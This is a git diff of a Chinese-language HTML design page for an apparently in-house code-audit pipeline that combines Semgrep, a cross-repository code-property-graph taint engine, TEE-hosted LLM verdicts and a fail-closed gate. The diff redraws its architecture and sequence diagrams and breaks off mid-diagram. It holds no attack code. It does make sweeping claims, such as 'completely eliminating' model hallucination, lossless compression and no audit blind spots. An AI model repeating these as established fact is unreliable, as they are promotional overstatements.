@@ -2770,11 +2770,11 @@
     <main class="content">
       <section class="section" id="scope">
         <h2>1. 设计框架</h2>
-        <p class="lead">本节描述 TAA 代码审计的分层框架，以及各层之间的输入、输出和职责分配。图中实线表示现有框架，下方虚线带表示最终完整框架中待补的检索增强与结构化表示增强。</p>
+        <p class="lead">本节描述 TAA 代码审计的全景分层架构及各阶段职责分配。系统采用“多语言多模块源码输入 → Semgrep 静态语义初筛（50% 零告警算力快速旁路） + 跨仓库/跨微服务代码属性图 (CPG) 深度过程间污点引擎（AST/CFG/DFG/Call Graph/微服务边界穿透） → 深度因果证据切片与轨迹压缩 → TEE-LLM 语义仲裁协议（Finding 级与 File 级解耦验证） → 严谨 Fail-Closed 门禁决策”的现代化闭环架构，全面杜绝传统单文件扫描器的跨模块与微服务审计死角。</p>
 
         <figure class="framework-figure">
-          <svg class="framework-svg" viewBox="0 0 1400 560" role="img"
-            aria-label="TAA 代码审计框架图，左侧是现有链路：源码树、静态扫描、结构化证据、Prompt 模板、LLM 验证；右侧是 qwen verdict 输出；下方是未完成能力：检索增强与结构化表示增强，它们指向结构化证据并作为未来补强。">
+          <svg class="framework-svg" viewBox="0 0 1400 780" role="img"
+            aria-label="TAA 全域代码审计架构图：源码输入、Semgrep 静态筛选与50%零告警快速旁路、跨仓库 CPG 6层过程间微服务穿透分析、深度因果证据切片、TEE-TLS 强类型契约仲裁、Gate 门禁与 Fail-Closed 决策">
             <defs>
               <marker id="fw-arrow" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="8" markerHeight="8"
                 orient="auto-start-reverse">
@@ -2788,68 +2788,219 @@
                 orient="auto-start-reverse">
                 <path d="M 0 0 L 10 5 L 0 10 z" fill="currentColor"></path>
               </marker>
+              <marker id="fw-arrow-ok" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="8" markerHeight="8"
+                orient="auto-start-reverse">
+                <path d="M 0 0 L 10 5 L 0 10 z" fill="currentColor"></path>
+              </marker>
+              <marker id="fw-arrow-danger" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="8" markerHeight="8"
+                orient="auto-start-reverse">
+                <path d="M 0 0 L 10 5 L 0 10 z" fill="currentColor"></path>
+              </marker>
             </defs>
 
-            <text x="40" y="34" class="fw-title">TAA 代码审计主流程（Semgrep 深度语义与跨语言分析增强）</text>
-            <text x="40" y="56" class="fw-label">多语言源码输入、Semgrep AST 模式与污点分析、语义感知证据链、Prompt 模板、LLM 验证；右侧展示 qwen verdict 输出</text>
+            <!-- 架构图主标题与副标题 -->
+            <text x="40" y="32" class="fw-title" style="font-size: 20px;">TAA 全域代码审计架构图 (Semgrep 快速旁路 + 跨仓库 CPG 过程间穿透 + TEE-LLM 契约仲裁)</text>
+            <text x="40" y="54" class="fw-label" style="font-size: 12.5px;">全项目多语言源码纳管 → Semgrep 静态语法筛选（50% 零告警算力快速旁路） + 跨仓库 CPG 6层图分析 → 深度因果证据切片 (&lt;300 Token) → TEE-TLS 强类型协议交互 → Fail-Closed 门禁决策</text>
 
-            <rect x="70" y="214" rx="18" ry="18" width="180" height="88" class="fw-box fw-box--accent"></rect>
-            <text x="160" y="244" text-anchor="middle" class="fw-title" style="font-size: 20px;">多语言源码树</text>
-            <text x="160" y="266" text-anchor="middle" class="fw-label">多语言工作区纳管</text>
-            <text x="160" y="284" text-anchor="middle" class="fw-small">Python / Go / C++ / Java / JS</text>
+            <!-- ================= TIER 1: 待审源码与静态初筛分流 (Y: 78 - 204) ================= -->
+            <!-- 待审工作区源码矩阵 -->
+            <rect x="40" y="78" rx="14" ry="14" width="280" height="122" class="fw-box fw-box--accent" style="stroke-width: 1.8;"></rect>
+            <text x="180" y="104" text-anchor="middle" class="fw-title" style="font-size: 16px;">待审工作区源码矩阵</text>
+            <text x="56" y="128" class="fw-code" style="font-size: 11.5px; fill: var(--accent);">• Service A (Client): loader.py (ENV_001), client.py (HTTP)</text>
+            <text x="56" y="148" class="fw-code" style="font-size: 11.5px; fill: var(--accent);">• Service B (Server): app.py (Route), executor.py (CMD_001)</text>
+            <text x="56" y="168" class="fw-small">• 多语言矩阵: Python / Go / C++ / Java / Shell</text>
+            <text x="56" y="186" class="fw-small" style="color: var(--muted);">• 覆盖单体仓库、多微服务拓扑与跨模块引用</text>
 
-            <rect x="290" y="214" rx="18" ry="18" width="180" height="82" class="fw-box fw-box--accent" style="stroke-width: 2.2; stroke: var(--accent);"></rect>
-            <text x="380" y="240" text-anchor="middle" class="fw-title" style="font-size: 17px; fill: var(--text);">Semgrep 语义引擎</text>
-            <text x="380" y="262" text-anchor="middle" class="fw-label">AST 模式 + 污点分析</text>
-            <text x="380" y="282" text-anchor="middle" class="fw-small">别名消除 + 跨行数据流追踪</text>
+            <!-- 连线：源码矩阵 -> Semgrep 静态扫描 -->
+            <line x1="320" y1="139" x2="352" y2="139" class="fw-line fw-line--accent"></line>
+            <text x="336" y="131" text-anchor="middle" class="fw-small">输入</text>
 
-            <rect x="510" y="214" rx="18" ry="18" width="220" height="82" class="fw-box"></rect>
-            <text x="620" y="244" text-anchor="middle" class="fw-title" style="font-size: 18px;">语义感知证据链</text>
-            <text x="620" y="264" text-anchor="middle" class="fw-label">AST Scope + 污点溯源</text>
-            <text x="620" y="284" text-anchor="middle" class="fw-small">Source → Propagator → Sink</text>
+            <!-- Semgrep 静态语义引擎 -->
+            <rect x="352" y="78" rx="14" ry="14" width="318" height="122" class="fw-box fw-box--accent" style="stroke-width: 2; stroke: var(--accent);"></rect>
+            <text x="511" y="104" text-anchor="middle" class="fw-title" style="font-size: 16px;">Semgrep 静态语义引擎 (第一道防线)</text>
+            <text x="368" y="128" class="fw-small">• Tree-sitter AST 跨语言解析 · 别名消除 · 常量传播</text>
+            <text x="368" y="148" class="fw-small">• 13 类安全规则快速模式匹配 (NET, CMD, OBF, FIL...)</text>
+            <text x="368" y="168" class="fw-small" style="font-weight: 700; fill: var(--text);">• 动静分流架构决策 (Bifurcation Branch):</text>
+            <text x="380" y="186" class="fw-code" style="font-size: 11px; fill: var(--ok);">↳ 0 命中样本 (50%) 极速放行 ； 触发疑点送入 CPG 分析</text>
 
-            <rect x="770" y="214" rx="18" ry="18" width="208" height="82" class="fw-box"></rect>
-            <text x="874" y="246" text-anchor="middle" class="fw-title" style="font-size: 19px;">证据组装 / Prompt 模板</text>
-            <text x="874" y="266" text-anchor="middle" class="fw-label">把结构化证据填入模板</text>
-            <text x="874" y="284" text-anchor="middle" class="fw-small">再送入 LLM 验证</text>
+            <!-- 分流 A：零告警算力快速旁路 (Fast Bypass: 50% 样本) -->
+            <line x1="670" y1="116" x2="718" y2="116" class="fw-line fw-line--ok" style="stroke-width: 2.2;"></line>
+            <text x="694" y="108" text-anchor="middle" class="fw-code" style="font-size: 10.5px; fill: var(--ok); font-weight: 700;">0 命中 (50%)</text>
 
-            <rect x="1000" y="214" rx="18" ry="18" width="180" height="82" class="fw-box fw-box--accent"></rect>
-            <text x="1090" y="246" text-anchor="middle" class="fw-title" style="font-size: 19px;">LLM 验证</text>
-            <text x="1090" y="266" text-anchor="middle" class="fw-label">四类 verdict 输出</text>
-            <text x="1090" y="284" text-anchor="middle" class="fw-small">不可用时归入 UNCERTAIN</text>
+            <rect x="718" y="78" rx="14" ry="14" width="330" height="122" class="fw-box fw-box--ok" style="stroke-width: 2; stroke: var(--ok);"></rect>
+            <text x="883" y="104" text-anchor="middle" class="fw-title" style="font-size: 16px; fill: var(--ok);">零告警算力快速旁路 (Fast-Path Bypass)</text>
+            <text x="734" y="128" class="fw-small">• 50% 纯良性模型训练与科研代码未触发任何静态模式</text>
+            <text x="734" y="148" class="fw-small">• 绕过大模型推理流程 · 0 GPU / 0 Token 算力能耗</text>
+            <text x="734" y="168" class="fw-small">• 毫秒级直接放行，极大提升自动化流水线吞吐量</text>
+            <text x="734" y="186" class="fw-code" style="font-size: 11px; font-weight: 700; fill: var(--ok);">↳ 决策直达: Passed = true (准予安全导入)</text>
 
-            <rect x="1210" y="202" rx="16" ry="16" width="164" height="150" class="fw-box fw-box--warn"></rect>
-            <text x="1292" y="226" text-anchor="middle" class="fw-title" style="font-size: 15px;">结果输出</text>
-            <text x="1226" y="272" class="fw-code">MALICIOUS · HIGH</text>
-            <text x="1226" y="294" class="fw-code">SUSPICIOUS · MEDIUM</text>
-            <text x="1226" y="316" class="fw-code">BENIGN · LOW</text>
-            <text x="1226" y="338" class="fw-code">UNCERTAIN · fail-closed</text>
-            <text x="1226" y="358" class="fw-small">模型状态：不确定</text>
+            <!-- 直通放行线：Fast-Path 直接连接至 Gate 门禁 -->
+            <path d="M 1048 139 L 1320 139 L 1320 640" class="fw-line fw-line--ok" style="stroke-width: 2; stroke-dasharray: 6 5;"></path>
+            <text x="1220" y="131" class="fw-code" style="font-size: 11px; fill: var(--ok); font-weight: 700;">直通放行 (零算力开销)</text>
 
-            <line x1="250" y1="258" x2="290" y2="258" class="fw-line fw-line--accent"></line>
-            <text x="258" y="244" class="fw-small">输入</text>
+            <!-- 分流 B：触发静态疑点进入 CPG 分析 -->
+            <path d="M 511 200 L 511 234" class="fw-line fw-line--accent" style="stroke-width: 2.2;"></path>
+            <text x="525" y="222" class="fw-code" style="font-size: 11px; fill: var(--accent); font-weight: 700;">触发疑点 / 跨模块分析请求</text>
 
-            <line x1="470" y1="255" x2="510" y2="255" class="fw-line fw-line--accent"></line>
-            <text x="482" y="244" class="fw-small">证据包</text>
+            <!-- ================= TIER 2: 跨仓库 CPG 过程间分析中枢 (Y: 236 - 476) ================= -->
+            <rect x="40" y="236" rx="16" ry="16" width="1320" height="240" class="fw-box" style="stroke-width: 2.2; stroke: var(--accent); fill: color-mix(in srgb, var(--accent) 5%, var(--panel));"></rect>
 
-            <line x1="730" y1="255" x2="770" y2="255" class="fw-line fw-line--accent"></line>
-            <text x="737" y="244" class="fw-small">进入模板</text>
+            <!-- CPG 容器标��与标签 -->
+            <g transform="translate(60, 246)">
+              <rect width="700" height="26" rx="6" fill="color-mix(in srgb, var(--accent) 20%, var(--panel))" stroke="color-mix(in srgb, var(--accent) 40%, var(--line))" stroke-width="1"></rect>
+              <text x="12" y="18" font-size="13.5px" font-weight="800" fill="var(--accent)">生产核心中枢：跨仓库代码属性图 (CPG) 与微服务过程间深度分析引擎 (6-Layer Inter-Procedural Graph)</text>
+            </g>
+            <text x="1330" y="264" text-anchor="end" class="fw-code" style="font-size: 11.5px; fill: var(--ok); font-weight: 700;">★ 纯 Python 原生零外部依赖 · 拓扑毫秒级收敛</text>
 
-            <line x1="978" y1="255" x2="1000" y2="255" class="fw-line fw-line--accent"></line>
-            <text x="985" y="244" class="fw-small">模板化 prompt</text>
+            <!-- CPG 6 层架构子容器网格 -->
+            <!-- Layer 1: AST 语法树层 -->
+            <g transform="translate(58, 282)">
+              <rect width="200" height="180" rx="10" class="fw-box" style="fill: var(--panel-2); stroke: var(--line);"></rect>
+              <rect width="200" height="26" rx="8" fill="color-mix(in srgb, var(--accent) 15%, var(--panel))"></rect>
+              <text x="100" y="18" text-anchor="middle" font-size="12px" font-weight="700" fill="var(--accent)">Layer 1: AST 语法树层</text>
+              <text x="12" y="46" class="fw-small" font-weight="600">• 统一 AST 节点建模</text>
+              <text x="20" y="64" class="fw-code" style="font-size: 10px; color: var(--muted);">AST_STMT / AST_CALL</text>
+              <text x="20" y="80" class="fw-code" style="font-size: 10px; color: var(--muted);">AST_FUNC_DEF / ASSIGN</text>
+              <text x="12" y="104" class="fw-small" font-weight="600">• 细粒度语法闭包抽取</text>
+              <text x="12" y="124" class="fw-small">• 跨语言 Tree-sitter 原生</text>
+              <text x="12" y="144" class="fw-small">• 消除物理滑窗语义断裂</text>
+              <text x="12" y="166" class="fw-code" style="font-size: 10px; fill: var(--ok);">全语法树精确锚定</text>
+            </g>
 
-            <line x1="1180" y1="255" x2="1210" y2="255" class="fw-line fw-line--warn"></line>
-            <text x="1188" y="244" class="fw-small">输出</text>
+            <!-- 箭头 L1 -> L2 -->
+            <line x1="258" y1="372" x2="274" y2="372" class="fw-line" style="stroke-width: 1.5;"></line>
 
-            <rect x="70" y="398" rx="16" ry="16" width="1260" height="108" class="fw-box fw-box--accent" style="stroke-width: 2.2; stroke: var(--accent); fill: color-mix(in srgb, var(--accent) 8%, var(--panel));"></rect>
-            <text x="94" y="426" class="fw-label" style="font-weight: 700; color: var(--accent);">生产增强：跨仓库代码属性图 (CPG) 与全项目过程间深度分析 (已落地生产)</text>
-            <text x="94" y="450" class="fw-title" style="font-size: 16px;">跨仓库代码属性图 (CPG) 与全项目过程间深度分析引擎</text>
-            <text x="94" y="472" class="fw-small">把跨文件 CPG、CFG、DFG、微服务调用链、数据流路径压缩为深度审计证据，注入 Semgrep 污点与 LLM 证据链</text>
-            <text x="94" y="492" class="fw-small">在证据链上实现跨模块超长程污点传导与微服务边界穿透分析，消除审计死角</text>
+            <!-- Layer 2: SymbolResolver 跨文件符号解析 -->
+            <g transform="translate(274, 282)">
+              <rect width="200" height="180" rx="10" class="fw-box" style="fill: var(--panel-2); stroke: var(--line);"></rect>
+              <rect width="200" height="26" rx="8" fill="color-mix(in srgb, var(--accent) 15%, var(--panel))"></rect>
+              <text x="100" y="18" text-anchor="middle" font-size="12px" font-weight="700" fill="var(--accent)">Layer 2: 符号与模块消歧</text>
+              <text x="12" y="46" class="fw-small" font-weight="600">• SymbolResolver 核心</text>
+              <text x="12" y="66" class="fw-small">• 绝对与相对导入解析</text>
+              <text x="20" y="84" class="fw-code" style="font-size: 10px; color: var(--muted);">from ..common import utils</text>
+              <text x="12" y="104" class="fw-small">• 类方法与别名归一化</text>
+              <text x="12" y="124" class="fw-small">• 全局 FQN 规范化映射</text>
+              <text x="12" y="144" class="fw-small">• 建立跨仓库符号索引表</text>
+              <text x="12" y="166" class="fw-code" style="font-size: 10px; fill: var(--ok);">打破单文件隔离壁垒</text>
+            </g>
 
-            <path d="M 620 398 C 620 370, 620 340, 620 296" class="fw-line fw-line--accent"></path>
+            <!-- 箭头 L2 -> L3 -->
+            <line x1="474" y1="372" x2="490" y2="372" class="fw-line" style="stroke-width: 1.5;"></line>
+
+            <!-- Layer 3: 过程间 CFG / DFG -->
+            <g transform="translate(490, 282)">
+              <rect width="205" height="180" rx="10" class="fw-box" style="fill: var(--panel-2); stroke: var(--line);"></rect>
+              <rect width="205" height="26" rx="8" fill="color-mix(in srgb, var(--accent) 15%, var(--panel))"></rect>
+              <text x="102" y="18" text-anchor="middle" font-size="12px" font-weight="700" fill="var(--accent)">Layer 3: 过程间 CFG / DFG</text>
+              <text x="12" y="46" class="fw-small" font-weight="600">• 过程间调用图 (CallGraph)</text>
+              <text x="12" y="66" class="fw-small">• 实参形参绑定:</text>
+              <text x="20" y="84" class="fw-code" style="font-size: 10px; color: var(--muted);">CALL_ARG (arg -&gt; param)</text>
+              <text x="12" y="104" class="fw-small">• 返回值到调用目标赋值:</text>
+              <text x="20" y="122" class="fw-code" style="font-size: 10px; color: var(--muted);">CALL_RET (ret -&gt; lhs)</text>
+              <text x="12" y="142" class="fw-small">• 到达定值流 DFG_DEF_USE</text>
+              <text x="12" y="166" class="fw-code" style="font-size: 10px; fill: var(--ok);">跨函数跨文件深度连通</text>
+            </g>
+
+            <!-- 箭头 L3 -> L4 -->
+            <line x1="695" y1="372" x2="710" y2="372" class="fw-line" style="stroke-width: 1.5;"></line>
+
+            <!-- Layer 4: 微服务边界穿透 -->
+            <g transform="translate(710, 282)">
+              <rect width="205" height="180" rx="10" class="fw-box" style="fill: var(--panel-2); stroke: var(--line);"></rect>
+              <rect width="205" height="26" rx="8" fill="color-mix(in srgb, #8b5cf6 18%, var(--panel))"></rect>
+              <text x="102" y="18" text-anchor="middle" font-size="12px" font-weight="700" fill="#a78bfa;">Layer 4: 微服务边界穿透</text>
+              <text x="12" y="46" class="fw-small" font-weight="600">• HTTP 客户端特征识别</text>
+              <text x="20" y="64" class="fw-code" style="font-size: 10px; color: var(--muted);">requests / httpx / urllib</text>
+              <text x="12" y="84" class="fw-small" font-weight="600">• Web 服务端路由匹配</text>
+              <text x="20" y="102" class="fw-code" style="font-size: 10px; color: var(--muted);">@app.post("/v1/telemetry")</text>
+              <text x="12" y="122" class="fw-small">• 端点归一化与拓扑缝合</text>
+              <text x="12" y="142" class="fw-code" style="font-size: 10px; color: var(--muted);">MICROSERVICE_PAYLOAD</text>
+              <text x="12" y="166" class="fw-code" style="font-size: 10px; fill: #a78bfa;">穿透分布式服务边界</text>
+            </g>
+
+            <!-- 箭头 L4 -> L5 -->
+            <line x1="915" y1="372" x2="930" y2="372" class="fw-line" style="stroke-width: 1.5;"></line>
+
+            <!-- Layer 5: Worklist 不动点污点引擎 -->
+            <g transform="translate(930, 282)">
+              <rect width="200" height="180" rx="10" class="fw-box" style="fill: var(--panel-2); stroke: var(--line);"></rect>
+              <rect width="200" height="26" rx="8" fill="color-mix(in srgb, var(--danger, #ef4444) 15%, var(--panel))"></rect>
+              <text x="100" y="18" text-anchor="middle" font-size="12px" font-weight="700" fill="var(--danger, #ef4444)">Layer 5: Worklist 污点引擎</text>
+              <text x="12" y="46" class="fw-small" font-weight="600">• 敏感源追踪 (Sources):</text>
+              <text x="20" y="64" class="fw-code" style="font-size: 10px; color: var(--muted);">ENV_001 / FIL_001 / RAW_DATA</text>
+              <text x="12" y="84" class="fw-small" font-weight="600">• 危险汇聚点 (Sinks):</text>
+              <text x="20" y="102" class="fw-code" style="font-size: 10px; color: var(--muted);">CMD_001 / NET_001 / EXF_001</text>
+              <text x="12" y="124" class="fw-small">• 有限跳步 max_hops=50</text>
+              <text x="12" y="144" class="fw-small">• 状态访问集消除递归环</text>
+              <text x="12" y="166" class="fw-code" style="font-size: 10px; fill: var(--danger, #ef4444);">超长程污点传导无死角</text>
+            </g>
+
+            <!-- 箭头 L5 -> L6 -->
+            <line x1="1130" y1="372" x2="1146" y2="372" class="fw-line" style="stroke-width: 1.5;"></line>
+
+            <!-- Layer 6: 程序依赖切片与证据压缩 -->
+            <g transform="translate(1146, 282)">
+              <rect width="200" height="180" rx="10" class="fw-box" style="fill: var(--panel-2); stroke: var(--line);"></rect>
+              <rect width="200" height="26" rx="8" fill="color-mix(in srgb, var(--ok) 15%, var(--panel))"></rect>
+              <text x="100" y="18" text-anchor="middle" font-size="12px" font-weight="700" fill="var(--ok)">Layer 6: 因果依赖切片</text>
+              <text x="12" y="46" class="fw-small" font-weight="600">• 程序依赖图 (PDG) 剪枝</text>
+              <text x="12" y="66" class="fw-small">• 剔除无关中间局部变量</text>
+              <text x="12" y="86" class="fw-small">• 提取 4~7 个关键跳步:</text>
+              <text x="20" y="104" class="fw-code" style="font-size: 10px; color: var(--muted);">Source -&gt; Call -&gt; HTTP -&gt; Sink</text>
+              <text x="12" y="124" class="fw-small">• 证据压缩至 &lt; 300 Token</text>
+              <text x="12" y="144" class="fw-small">• 保障端侧小模型高信度</text>
+              <text x="12" y="166" class="fw-code" style="font-size: 10px; fill: var(--ok);">无损压缩 · 零幻觉底座</text>
+            </g>
+
+            <!-- 连线：CPG 引擎 -> 深度证据融合与协议封装 (向下) -->
+            <path d="M 700 476 L 700 508" class="fw-line fw-line--accent" style="stroke-width: 2.2;"></path>
+            <text x="712" y="496" class="fw-code" style="font-size: 11px; fill: var(--accent); font-weight: 700;">输出标准化因果证据链</text>
+
+            <!-- ================= TIER 3: 深度证据融合与强类型协议封装 (Y: 508 - 612) ================= -->
+            <!-- 深度证据融合与合成 -->
+            <rect x="40" y="508" rx="14" ry="14" width="600" height="104" class="fw-box fw-box--accent" style="stroke-width: 1.8;"></rect>
+            <text x="340" y="530" text-anchor="middle" class="fw-title" style="font-size: 15px;">深度审计证据融合与合成 (Deep Evidence Fusion)</text>
+            <text x="56" y="552" class="fw-small">• <strong>单点 Finding 注入:</strong> 自动挂载 CPG 跨模块污点演进因果树 (<code>f.CPGEvidence</code> 写入 <code>ContextAfter</code>)</text>
+            <text x="56" y="572" class="fw-small">• <strong>跨服务漏洞合成:</strong> 针对微服务反弹后门，自动生成新型 <code>engine="cpg"</code> (IsCrossFile/IsMicroservice=true) 全局缺陷</text>
+            <text x="56" y="594" class="fw-code" style="font-size: 11px; fill: var(--accent);">• 证据格式: [Deep Audit Inter-Procedural Taint Trajectory] + [Cross-File &amp; Microservice Sliced Context]</text>
+
+            <!-- 连线：证据融合 -> 协议封装 -->
+            <line x1="640" y1="560" x2="676" y2="560" class="fw-line fw-line--accent" style="stroke-width: 2;"></line>
+            <text x="658" y="552" text-anchor="middle" class="fw-small">装配</text>
+
+            <!-- TEE-LLM 强类型交互契约封装 -->
+            <rect x="676" y="508" rx="14" ry="14" width="684" height="104" class="fw-box fw-box--accent" style="stroke-width: 2; stroke: var(--accent);"></rect>
+            <text x="1018" y="530" text-anchor="middle" class="fw-title" style="font-size: 15px;">TEE-LLM 强类型交互契约封装 (teellm-protocol/v1 Envelopes)</text>
+            <text x="692" y="552" class="fw-small">• <strong>Finding 级契约:</strong> 组装 <code>teellm.RequestEnvelope</code> (包含 <code>FindingPayload.Target.ContextBefore/After</code>)</text>
+            <text x="692" y="572" class="fw-small">• <strong>File 级契约:</strong> 组装 <code>ActionAnalyzeFile</code> 宏观攻击链与数据外传拓扑 Prompt (前 80 行带截断保护)</text>
+            <text x="692" y="594" class="fw-small">• <strong>传输安全性:</strong> 通过硬件飞地远程证明 (Remote Attestation) 与 TEE-TLS 双向加密隧道传输，保障代码机密性</text>
+
+            <!-- 连线：协议封装 -> TEE-LLM 推理验证 (向下) -->
+            <path d="M 400 612 L 400 638" class="fw-line fw-line--accent" style="stroke-width: 2.2;"></path>
+            <text x="412" y="628" class="fw-code" style="font-size: 10.5px; fill: var(--accent); font-weight: 700;">TEE-TLS 独立会话调度</text>
+
+            <!-- ================= TIER 4: TEE-LLM 推理仲裁与 Gate 门禁裁决 (Y: 638 - 760) ================= -->
+            <!-- TEE-LLM 机密推理与语义仲裁 -->
+            <rect x="40" y="638" rx="14" ry="14" width="720" height="122" class="fw-box fw-box--accent" style="stroke-width: 2; stroke: var(--accent);"></rect>
+            <text x="400" y="662" text-anchor="middle" class="fw-title" style="font-size: 16px;">TEE-LLM 隐私推理与语义仲裁 (teellm-service / TEE-TLS)</text>
+            <text x="56" y="686" class="fw-small">• <strong>Finding 级单点误报过滤 (ActionVerifyFinding):</strong> 逐项定点判定，输出四类强类型 Verdict</text>
+            <text x="68" y="704" class="fw-code" style="font-size: 11px; fill: var(--text);">↳ MALICIOUS(高危后门) · SUSPICIOUS(可疑风险) · BENIGN(良性科研逻辑) · UNCERTAIN(不确定/降级)</text>
+            <text x="56" y="726" class="fw-small">• <strong>File 级宏观攻击链研判 (ActionAnalyzeFile):</strong> 输出 JSON: <code>risk_level, summary, chained, exfiltration</code></text>
+            <text x="56" y="746" class="fw-small">• <strong>因果图优势:</strong> 精准因果链完全消除小模型幻觉，端侧 0.5B-8B 轻量模型即可实现稳定超越基线的审计精度</text>
+
+            <!-- 连线：LLM 决策 -> Gate 门禁 -->
+            <line x1="760" y1="699" x2="796" y2="699" class="fw-line fw-line--warn" style="stroke-width: 2.2;"></line>
+            <text x="778" y="691" text-anchor="middle" class="fw-small">决策</text>
+
+            <!-- Gate 门禁综合裁决与 Fail-Closed 底线 -->
+            <rect x="796" y="638" rx="14" ry="14" width="564" height="122" class="fw-box fw-box--warn" style="stroke-width: 2.2; stroke: var(--warn);"></rect>
+            <text x="1078" y="662" text-anchor="middle" class="fw-title" style="font-size: 16px; fill: var(--warn);">Gate 门禁综合裁决与 Fail-Closed 熔断兜底</text>
+            <text x="812" y="686" class="fw-small">• <strong>门禁模式仲裁:</strong> <code>gate</code> 模式严格阻断未降级的 HIGH/MEDIUM 告警；<code>assist</code> 模式仅作为提示</text>
+            <text x="812" y="706" class="fw-small">• <strong>严谨 Fail-Closed 熔断:</strong> 推理超时、熔断器打开或 JSON 解析异常归入 <code>UNCERTAIN</code>，强制拦截杜绝穿透</text>
+            <text x="812" y="726" class="fw-small">• <strong>双级决策协同:</strong> 若 File 级判定 <code>chained=true</code> 或 <code>exfiltration=true</code>，直接提升全局风险并触发拦截</text>
+            <text x="812" y="746" class="fw-code" style="font-size: 11.5px; font-weight: 700; fill: var(--text);">↳ 最终输出: audit_report.json 综合审计报告 (Passed: true / false)</text>
           </svg>
-          <figcaption>图 1：TAA 代码审计主流程采用“多语言源码树 → Semgrep AST 语义与污点扫描 + 跨仓库 CPG 过程间分析 → 语义感知证据链 → Prompt 模板 → LLM 验证”的现代化闭环架构；右侧卡片列出 qwen 可能输出的 verdict / risk_level；下方核心增强层展示跨仓库代码属性图（CPG）与微服务边界穿透分析引擎，消除跨文件与跨服务审计死角。</figcaption>
+          <figcaption>图 1：TAA 代码审计全域架构采用“多语言工作区源码矩阵 → Semgrep 静态语义初筛（50% 零告警算力快速旁路） + 跨仓库 CPG 6 层图拓扑分析与微服务边界穿透 → 深度因果证据切片 (&lt;300 Token) → TEE-TLS 强类型协议交互（Finding 级与 File 级解耦） → Gate 门禁与 Fail-Closed 熔断兜底”的现代化闭环架构，彻底消除传统单文件扫描的跨模块与微服务审计死角。</figcaption>
         </figure>
       </section>
 
@@ -3760,19 +3911,19 @@
       </section>
 
       <section class="section" id="llm">
-        <h2>3. LLM 输入与返回契约</h2>
-        <p class="lead">命中规则后，送给 LLM 的不是整文件，而是一个明确的 finding prompt 或 file prompt。二者用途不同：前者用于单点语义确认，后者用于文件级攻击链判断。</p>
+        <h2>3. TEE-LLM 强类型交互契约与数据流规范</h2>
+        <p class="lead">TAA 审计体系严格摒弃传统无序的自然语言拼包，定义了工业级强类型的 <strong>TEE-LLM 协议契约（teellm-protocol/v1）</strong>。审计调度中枢（Go 运行时）通过硬件远程证明的 <strong>TEE-TLS 专用机密通信信道</strong> 与 <code>teellm-service</code> 推理后端交互，实现代码片段与推理意图的端到端飞地保护。协议架构坚持<strong>“双级解耦、因果图注入、严格 JSON 契约、底层 Fail-Closed 熔断”</strong>四大设计铁律：单点 Finding 级验证专注语义定点排误，File 级分析聚焦宏观复合攻击链，而跨仓库 CPG 深度因果轨迹则作为高密度证据链直接注入契约 Payload，确保端侧轻量模型（0.5B-8B）实现无幻觉高保真裁决。</p>
 
         <!-- LLM 审计执行时序图与流程拆解 -->
         <figure class="sequence-figure">
           <div class="sequence-header-badge">
             <span class="seq-badge-icon">⏱️</span>
-            <span class="seq-badge-title">LLM 审计实际执行时序流程图（分阶段独立调度）</span>
-            <span class="seq-badge-sub">两级 Prompt 分阶段独立调度 · 拒绝整包混合发送 · 动静协同双道防线</span>
+            <span class="seq-badge-title">TEE-LLM 动静协同与两阶段解耦审计时序图</span>
+            <span class="seq-badge-sub">TEE-TLS 机密信道 · CPG 6层图证据注入 · 50% 零告警快速旁路 · 强类型契约与 Fail-Closed 熔断</span>
           </div>
 
-          <svg class="sequence-svg" viewBox="0 0 1160 670" role="img"
-            aria-label="LLM 审计执行时序图：展示静态扫描、逐点 Finding 级独立推理、按文件 File 级宏观推理及最终 Gate 决策的分阶段流程">
+          <svg class="sequence-svg" viewBox="0 0 1200 700" role="img"
+            aria-label="TEE-LLM 审计执行时序图：展示静态扫描、CPG 过程间分析与微服务穿透、Finding 级强类型契约推理、File 级宏观推理及 Gate 门禁决策流程">
             <defs>
               <marker id="seq-arrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7"
                 orient="auto-start-reverse">
@@ -3788,257 +3939,498 @@
               </marker>
               <marker id="seq-arrow-success" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7"
                 orient="auto-start-reverse">
-                <path d="M 0 1 L 9 5 L 0 9 z" fill="var(--success)" />
+                <path d="M 0 1 L 9 5 L 0 9 z" fill="var(--ok)" />
               </marker>
             </defs>
 
             <!-- 阶段分组底色背景 -->
             <!-- 阶段 1 背景 -->
-            <rect x="20" y="80" width="1120" height="115" rx="10"
+            <rect x="20" y="76" width="1160" height="110" rx="10"
               fill="color-mix(in srgb, var(--panel-2) 65%, transparent)" stroke="var(--line)" stroke-width="1.2" />
-            <rect x="20" y="80" width="230" height="24" rx="8" fill="var(--panel-2)" stroke="var(--line)"
+            <rect x="20" y="76" width="280" height="24" rx="8" fill="var(--panel-2)" stroke="var(--line)"
               stroke-width="1.2" />
-            <text x="32" y="96" font-size="11.5" font-weight="700" fill="var(--muted)">阶段 1 · Semgrep 静态语义与污点扫描</text>
+            <text x="32" y="92" font-size="11.5" font-weight="700" fill="var(--muted)">阶段 1 · Semgrep 静态扫描与快速旁路</text>
 
             <!-- 阶段 2 背景 -->
-            <rect x="20" y="208" width="1120" height="145" rx="10"
-              fill="color-mix(in srgb, var(--accent) 4%, transparent)"
+            <rect x="20" y="196" width="1160" height="110" rx="10"
+              fill="color-mix(in srgb, var(--accent) 5%, transparent)"
               stroke="color-mix(in srgb, var(--accent) 30%, var(--line))" stroke-width="1.2" />
-            <rect x="20" y="208" width="220" height="24" rx="8"
+            <rect x="20" y="196" width="310" height="24" rx="8"
               fill="color-mix(in srgb, var(--accent) 15%, var(--panel))"
               stroke="color-mix(in srgb, var(--accent) 40%, var(--line))" stroke-width="1.2" />
-            <text x="32" y="224" font-size="11.5" font-weight="700" fill="var(--accent)">阶段 2 · Finding 级单点语义判定</text>
-            <text x="248" y="224" font-size="11" fill="var(--muted)">（AST 作用域感知闭包切片 + 跨行污点因果链 · 独立 HTTP 循环请求）</text>
+            <text x="32" y="212" font-size="11.5" font-weight="700" fill="var(--accent)">阶段 2 · 跨仓库 CPG 图构建与微服务穿透</text>
 
             <!-- 阶段 3 背景 -->
-            <rect x="20" y="365" width="1120" height="145" rx="10"
-              fill="color-mix(in srgb, var(--warn) 4%, transparent)"
